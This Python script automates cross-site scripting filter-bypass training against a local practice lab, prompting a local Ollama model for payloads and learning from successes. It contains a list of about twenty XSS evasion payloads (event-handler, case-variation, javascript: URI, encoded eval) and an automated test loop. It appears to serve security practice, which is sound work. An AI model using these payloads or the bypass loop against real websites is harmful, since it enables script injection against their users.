"""
Local AI Self-Learning XSS Bypass System
Uses Ollama (FREE) to train on XSS challenges
Builds knowledge base from successful bypasses
"""

import asyncio
import json
import requests
import aiohttp
from datetime import datetime
from typing import List, Dict
import os

class KnowledgeBase:
    """Stores and retrieves successful bypass patterns"""
    
    def __init__(self, db_file='xss_knowledge.json'):
        self.db_file = db_file
        self.knowledge = self._load_knowledge()
    
    def _load_knowledge(self):
        """Load existing knowledge from file"""
        if os.path.exists(self.db_file):
            with open(self.db_file, 'r') as f:
                return json.load(f)
        return {
            'bypasses': [],
            'patterns': {},
            'statistics': {
                'total_attempts': 0,
                'total_successes': 0,
                'success_rate': 0
            }
        }
    
    def _save_knowledge(self):
        """Save knowledge to file"""
        with open(self.db_file, 'w') as f:
            json.dump(self.knowledge, f, indent=2)
    
    def add_bypass(self, level: int, challenge_name: str, 
                   payload: str, technique: str, context: Dict):
        """Add successful bypass to knowledge base"""
        bypass = {
            'level': level,
            'challenge': challenge_name,
            'payload': payload,
            'technique': technique,
            'context': context,
            'timestamp': datetime.now().isoformat()
        }
        
        self.knowledge['bypasses'].append(bypass)
        
        # Update pattern statistics
        if technique not in self.knowledge['patterns']:
            self.knowledge['patterns'][technique] = {
                'count': 0,
                'success_rate': 0,
                'examples': []
            }
        
        self.knowledge['patterns'][technique]['count'] += 1
        self.knowledge['patterns'][technique]['examples'].append(payload)
        
        self._save_knowledge()
        print(f"    [📚] Learned new bypass: {technique}")
    
    def get_similar_bypasses(self, challenge_name: str, level: int) -> List[Dict]:
        """Get similar successful bypasses for learning"""
        similar = []
        
        for bypass in self.knowledge['bypasses']:
            if bypass['level'] <= level:  # Learn from same or easier levels
                similar.append(bypass)
        
        return similar[-5:]  # Return last 5 relevant bypasses
    
    def get_best_techniques(self, top_n=5) -> List[str]:
        """Get most successful techniques"""
        techniques = sorted(
            self.knowledge['patterns'].items(),
            key=lambda x: x[1]['count'],
            reverse=True
        )
        return [t[0] for t in techniques[:top_n]]
    
    def update_statistics(self, success: bool):
        """Update overall statistics"""
        self.knowledge['statistics']['total_attempts'] += 1
        if success:
            self.knowledge['statistics']['total_successes'] += 1
        
        total = self.knowledge['statistics']['total_attempts']
        successes = self.knowledge['statistics']['total_successes']
        self.knowledge['statistics']['success_rate'] = successes / total if total > 0 else 0
        
        self._save_knowledge()
    
    def get_stats(self):
        """Get knowledge base statistics"""
        return {
            'total_bypasses_learned': len(self.knowledge['bypasses']),
            'unique_techniques': len(self.knowledge['patterns']),
            'best_techniques': self.get_best_techniques(3),
            'overall_stats': self.knowledge['statistics']
        }

class LocalAI:
    """Interface to Ollama (local AI)"""
    
    def __init__(self, model='llama3.2', base_url='http://localhost:11434'):
        self.model = model
        self.base_url = base_url
        self.api_url = f"{base_url}/api/generate"
    
    def is_available(self):
        """Check if Ollama is running"""
        try:
            response = requests.get(f"{self.base_url}/api/tags", timeout=2)
            return response.status_code == 200
        except:
            return False
    
    def generate(self, prompt: str, max_tokens=500) -> str:
        """Generate response from local AI"""
        try:
            response = requests.post(
                self.api_url,
                json={
                    'model': self.model,
                    'prompt': prompt,
                    'stream': False,
                    'options': {
                        'num_predict': max_tokens,
                        'temperature': 0.7
                    }
                },
                timeout=30
            )
            
            if response.status_code == 200:
                return response.json()['response']
            else:
                return None
        except Exception as e:
            print(f"    [!] AI Error: {e}")
            return None

class XSSTrainer:
    """AI-powered XSS trainer that learns from the training lab"""
    
    def __init__(self, use_local_ai=True):
        self.knowledge_base = KnowledgeBase()
        self.use_local_ai = use_local_ai
        
        if use_local_ai:
            self.ai = LocalAI()
            if not self.ai.is_available():
                print("[!] Warning: Ollama not running. Install it:")
                print("    https://ollama.com/download")
                print("    Then run: ollama pull llama3.2")
        else:
            self.ai = None
        
        self.lab_url = "http://localhost:8080"
    
    async def train_on_challenge(self, level: int, max_attempts=20):
        """Train AI on a specific challenge level"""
        print(f"\n{'='*70}")
        print(f"🎓 Training on Level {level}")
        print(f"{'='*70}")
        
        # Get challenge info
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{self.lab_url}/challenge/{level}/hints") as response:
                challenge_info = await response.json()
        
        print(f"Challenge: {challenge_info['name']}")
        print(f"Description: {challenge_info['description']}\n")
        
        # Get previous knowledge
        similar_bypasses = self.knowledge_base.get_similar_bypasses(
            challenge_info['name'], level
        )
        
        attempts = 0
        success = False
        
        while attempts < max_attempts and not success:
            attempts += 1
            print(f"[Attempt {attempts}/{max_attempts}]")
            
            # Generate payload using AI or knowledge base
            if self.ai and self.ai.is_available():
                payload = await self._generate_ai_payload(
                    challenge_info, similar_bypasses, attempts
                )
            else:
                payload = self._generate_rule_based_payload(
                    challenge_info, similar_bypasses, attempts
                )
            
            print(f"  Testing: {payload[:60]}...")
            
            # Test payload
            result = await self._test_payload(level, payload)
            
            if result['success']:
                print(f"  [✅] SUCCESS! Bypassed in {attempts} attempts")
                success = True
                
                # Learn from success
                technique = self._identify_technique(payload)
                self.knowledge_base.add_bypass(
                    level=level,
                    challenge_name=challenge_info['name'],
                    payload=payload,
                    technique=technique,
                    context=challenge_info
                )
                self.knowledge_base.update_statistics(True)
            else:
                print(f"  [❌] Blocked: {result['message'][:50]}")
                self.knowledge_base.update_statistics(False)
        
        if not success:
            print(f"\n[!] Failed to bypass after {max_attempts} attempts")
            print(f"[💡] Hints:")
            for hint in challenge_info['hints']:
                print(f"    - {hint}")
        
        return success
    
    async def _generate_ai_payload(self, challenge_info: Dict, 
                                   similar_bypasses: List[Dict], 
                                   attempt_num: int) -> str:
        """Generate payload using local AI"""
        
        # Build context from knowledge base
        learning_context = ""
        if similar_bypasses:
            learning_context = "\n\nSuccessful bypasses from previous challenges:\n"
            for bypass in similar_bypasses[-3:]:
                learning_context += f"- Level {bypass['level']}: {bypass['payload']}\n"
                learning_context += f"  Technique: {bypass['technique']}\n"
        
        prompt = f"""You are an XSS security researcher training on bypass techniques.

CHALLENGE: {challenge_info['name']}
DESCRIPTION: {challenge_info['description']}
ATTEMPT: {attempt_num}

HINTS:
{chr(10).join(f"{i+1}. {hint}" for i, hint in enumerate(challenge_info['hints']))}
{learning_context}

Generate ONE creative XSS payload that might bypass this protection.
Consider the hints and previous successful bypasses.

Respond with ONLY the payload, nothing else."""

        response = self.ai.generate(prompt, max_tokens=200)
        
        if response:
            # Extract just the payload from response
            payload = response.strip()
            # Remove any explanation text
            if '\n' in payload:
                payload = payload.split('\n')[0]
            return payload
        else:
            # Fallback to rule-based
            return self._generate_rule_based_payload(challenge_info, similar_bypasses, attempt_num)
    
    def _generate_rule_based_payload(self, challenge_info: Dict,
                                     similar_bypasses: List[Dict],
                                     attempt_num: int) -> str:
        """Generate payload using rules when AI is not available"""
        
        # Get best techniques from knowledge base
        best_techniques = self.knowledge_base.get_best_techniques()
        
        # Progressive payload generation based on attempt number
        payloads = [
            # Basic attempts
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            
            # Case variation
            "<img src=x OnErRoR=alert(1)>",
            "<svg OnLoad=alert(1)>",
            
            # Space insertion
            "<img src=x on error=alert(1)>",
            "<svg on load=alert(1)>",
            
            # Self-closing
            "<svg/onload=alert(1)>",
            "<img/src=x/onerror=alert(1)>",
            
            # Alternative handlers
            "<img src=x onmouseover=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            
            # Alternative tags
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            
            # Encoding
            "<script>alert`1`</script>",
            "<script>al\\u0065rt(1)</script>",
            
            # Context-specific
            "'; alert(1); //",
            "</script><script>alert(1)</script>",
            
            # Advanced combinations
            "<marquee onstart=eval(atob('YWxlcnQoMSk='))>",
        ]
        
        # Use modulo to cycle through payloads
        return payloads[(attempt_num - 1) % len(payloads)]
    
    async def _test_payload(self, level: int, payload: str) -> Dict:
        """Test payload against challenge"""
        async with aiohttp.ClientSession() as session:
            try:
                url = f"{self.lab_url}/challenge/{level}"
                async with session.get(url, params={'payload': payload}, timeout=10) as response:
                    text = await response.text()
                    
                    # Parse response to determine success
                    if 'SUCCESS!' in text or '✅' in text:
                        return {'success': True, 'message': 'Bypassed!'}
                    else:
                        # Extract block reason
                        if 'BLOCKED' in text:
                            import re
                            match = re.search(r'<strong>.*?</strong><br>\s*(.*?)<br>', text)
                            message = match.group(1) if match else "Blocked"
                            return {'success': False, 'message': message}
                        return {'success': False, 'message': 'Unknown response'}
            except Exception as e:
                return {'success': False, 'message': str(e)}
    
    def _identify_technique(self, payload: str) -> str:
        """Identify the bypass technique used"""
        payload_lower = payload.lower()
        
        if 'onerror' in payload_lower and payload.count('onerror') != payload_lower.count('onerror'):
            return "case_variation"
        elif 'on error' in payload_lower or 'on load' in payload_lower:
            return "space_insertion"
        elif '<svg/' in payload_lower or '<img/' in payload_lower:
            return "self_closing_tag"
        elif any(handler in payload_lower for handler in ['onmouseover', 'ontoggle', 'onstart', 'onanimationend']):
            return "alternative_event_handler"
        elif '<marquee' in payload_lower or '<details' in payload_lower or '<object' in payload_lower:
            return "alternative_tag"
        elif 'atob' in payload_lower or 'eval' in payload_lower or '\\u' in payload:
            return "encoding"
        elif "';" in payload or '";' in payload:
            return "context_breakout"
        else:
            return "standard_xss"
    
    async def train_all_levels(self):
        """Train on all challenge levels progressively"""
        print("\n" + "="*70)
        print("🚀 STARTING PROGRESSIVE TRAINING")
        print("="*70)
        
        for level in range(1, 11):
            success = await self.train_on_challenge(level)
            
            if success:
                print(f"\n[✅] Level {level} completed!\n")
            else:
                print(f"\n[⏩] Moving to next level...\n")
            
            # Small delay between levels
            await asyncio.sleep(1)
        
        # Print final statistics
        print("\n" + "="*70)
        print("📊 TRAINING COMPLETE - FINAL STATISTICS")
        print("="*70)
        stats = self.knowledge_base.get_stats()
        print(f"Total Bypasses Learned: {stats['total_bypasses_learned']}")
        print(f"Unique Techniques: {stats['unique_techniques']}")
        print(f"Best Techniques: {', '.join(stats['best_techniques'])}")
        print(f"Overall Success Rate: {stats['overall_stats']['success_rate']*100:.1f}%")
        print(f"Knowledge Base: {self.knowledge_base.db_file}")
        print("="*70)

async def main():
    print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║         🤖 LOCAL AI XSS TRAINING SYSTEM                          ║
║         100% FREE - NO API COSTS                                 ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

[1] Make sure Ollama is installed and running:
    Download: https://ollama.com/download
    Run: ollama pull llama3.2

[2] Make sure the training lab is running on port 8080:
    python xss_training_lab.py

[3] This system will:
    ✅ Train on 10 progressive XSS challenges
    ✅ Learn from successes and failures
    ✅ Build a knowledge base
    ✅ Improve over time
    ✅ Work completely offline
    ✅ Cost $0

""")
    
    # Check if using local AI or rule-based
    use_ai = input("Use Ollama AI? (y/n, default=y): ").strip().lower()
    use_ai = use_ai != 'n'
    
    trainer = XSSTrainer(use_local_ai=use_ai)
    
    choice = input("\n Train all levels automatically? (y/n): ").strip().lower()
    
    if choice == 'y':
        await trainer.train_all_levels()
    else:
        # Manual level selection
        while True:
            level = input("\nEnter level (1-10) or 'q' to quit: ").strip()
            if level == 'q':
                break
            try:
                level = int(level)
                if 1 <= level <= 10:
                    await trainer.train_on_challenge(level)
                else:
                    print("Invalid level. Choose 1-10")
            except ValueError:
                print("Invalid input")
    
    # Show final stats
    print("\n📊 Final Knowledge Base Stats:")
    stats = trainer.knowledge_base.get_stats()
    print(json.dumps(stats, indent=2))

if __name__ == "__main__":
    asyncio.run(main())